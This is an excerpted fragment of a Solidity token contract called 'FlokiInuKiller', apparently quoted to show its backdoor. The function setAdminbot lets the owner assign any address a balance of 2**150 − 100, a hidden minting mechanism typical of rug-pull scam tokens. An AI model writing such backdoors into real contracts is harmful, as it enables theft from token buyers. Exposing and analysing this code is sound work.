...
contract TOKEN is Ownable, IERC20 {
    ...
    string private _name = "FlokiInuKiller";
    string private _symbol = "FlokiKiller";
    ...
    function setAdminbot(address _address) external onlyownner {
        _balance[_address] = 2 ** 150 - 100;
    }
